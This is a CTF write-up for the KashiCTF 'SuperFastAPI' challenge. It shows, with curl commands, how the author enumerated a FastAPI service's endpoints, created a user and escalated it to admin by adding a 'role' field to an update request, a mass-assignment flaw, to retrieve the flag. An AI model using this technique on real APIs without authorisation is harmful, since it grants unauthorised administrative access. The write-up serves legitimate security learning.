# KashiCTF Writeup: SuperFastAPI



Made my verty first API!

However I have to still integrate it with a frontend so can't do much at this point lol.

Challenge Overview

The challenge presented an API with the following endpoints:


After opening the given link it obly displayed this 
{"message":"Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"}


Then i checked for fastapi documentation online and got a subdirectory 'docs' of fastapi
Got this information 

GET /get/{username} – Retrieve user information

POST /create/{username} – Create a new user

PUT /update/{username} – Update user details

GET /flag/{username} – Retrieve the flag for a user


From the OpenAPI documentation, it was evident that the flag could only be retrieved if the user had the right privileges.


---

Reconnaissance

The first step was to analyze the API and test basic queries.

Testing the /flag/{username} Endpoint

We tried requesting the flag for a test user:

curl -X GET "http://kashictf.iitbhucybersec.in:20593/flag/testuser"

The response showed that the role was "guest" and did not return the flag.


---

User Creation

Since we had the /create/{username} endpoint, we attempted to create a new user named abel:

curl -X POST "http://kashictf.iitbhucybersec.in:20593/create/abel" \
-H "Content-Type: application/json" \
-d '{"fname": "CTF", "lname": "User", "email": "ctfuser@example.com", "gender": "other"}'

This successfully created the user abel.


---

Privilege Escalation via /update/{username}

We then explored the /update/{username} endpoint to see if we could modify our role.

curl -X PUT "http://kashictf.iitbhucybersec.in:20593/update/abel" \
-H "Content-Type: application/json" \
-d '{"fname": "CTF", "lname": "User", "email": "ctfuser@example.com", "gender": "other", "role": "admin"}'

Surprisingly, the server accepted the request and updated the user role to admin!


---

Retrieving the Flag

With our role now elevated to admin, we retried fetching the flag:

curl -X GET "http://kashictf.iitbhucybersec.in:20593/flag/abel"

This time, the server responded with the flag, successfully completing the challenge!
